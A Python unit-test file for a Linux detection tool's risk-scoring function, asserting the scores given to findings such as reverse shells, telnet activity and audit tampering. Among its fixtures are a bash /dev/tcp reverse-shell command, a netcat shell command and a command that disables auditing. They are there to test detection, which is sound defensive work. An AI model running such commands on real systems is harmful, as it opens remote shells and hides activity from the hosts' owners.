from src.detection.linux_advanced_risk_scoring import (
    calculate_advanced_linux_risk_score,)
from src.models.linux_process_execution import LinuxProcessExecution
from src.models.threat_finding import ThreatFinding


def create_finding(
    title: str,
) -> ThreatFinding:
    return ThreatFinding(title=title,
        severity="high",
        description="Test Linux finding",
        source="Linux Host Detection",
        recommendation="Investigate activity",)


def create_execution(
    command: str = "",
    user: str = "",
    source_ip: str = "",
) -> LinuxProcessExecution:
    return LinuxProcessExecution(command=command,
        executable=(command.split()[0]
            if command
            else ""),
        process="",
        user=user,
        source_ip=source_ip,
        hostname="ubuntu-server",
        timestamp="jul 7 10:00:01",
        raw_text=command,)


def test_reverse_shell_base_score():
    finding = create_finding("Linux Reverse Shell Detected")
    execution = create_execution()

    score = calculate_advanced_linux_risk_score(finding,execution,)

    assert score == 95


def test_reverse_shell_root_score_is_capped():
    finding = create_finding("Linux Reverse Shell Detected")
    execution = create_execution(
        command="/bin/bash -i >& /dev/tcp/8.8.8.8/4444 0>&1",
        user="root",source_ip="8.8.8.8",)

    score = calculate_advanced_linux_risk_score(finding,execution,)

    assert score == 100


def test_suspicious_process_base_score():
    finding = create_finding("Suspicious Linux Process Execution Detected")
    execution = create_execution()

    score = calculate_advanced_linux_risk_score(finding,execution,)

    assert score == 65


def test_root_user_increases_score():
    finding = create_finding("Suspicious Linux Process Execution Detected")
    execution = create_execution(user="root",)

    score = calculate_advanced_linux_risk_score(finding,execution,)

    assert score == 70


def test_external_ip_increases_score():
    finding = create_finding("Advanced Telnet Activity Detected")
    execution = create_execution(source_ip="8.8.8.8",)

    score = calculate_advanced_linux_risk_score(finding,execution,)

    assert score == 65


def test_private_ip_does_not_increase_score():
    finding = create_finding("Advanced Telnet Activity Detected")
    execution = create_execution(source_ip="10.0.0.5",)

    score = calculate_advanced_linux_risk_score(finding,execution,)

    assert score == 60


def test_high_risk_command_increases_score():
    finding = create_finding(
        "Suspicious Linux Process Execution Detected")
    execution = create_execution(command="nc -e /bin/sh 8.8.8.8 4444",)

    score = calculate_advanced_linux_risk_score(finding,execution,)

    assert score == 70


def test_audit_tampering_root_score():
    finding = create_finding("Linux Audit Tampering Activity Detected")
    execution = create_execution(command="auditctl -e 0",user="root",)

    score = calculate_advanced_linux_risk_score(finding,execution,)

    assert score == 100


def test_unknown_linux_finding_uses_default_score():
    finding = create_finding("Unknown Linux Finding")
    execution = create_execution()

    score = calculate_advanced_linux_risk_score(finding,execution,)

    assert score == 50


def test_invalid_ip_does_not_increase_score():
    finding = create_finding("Advanced Telnet Activity Detected")
    execution = create_execution(source_ip="not-an-ip",)

    score = calculate_advanced_linux_risk_score(finding,execution,)

    assert score == 60


def test_empty_ip_does_not_increase_score():
    finding = create_finding("Advanced Telnet Activity Detected")
    execution = create_execution(source_ip="",)

    score = calculate_advanced_linux_risk_score(finding,execution,)

    assert score == 60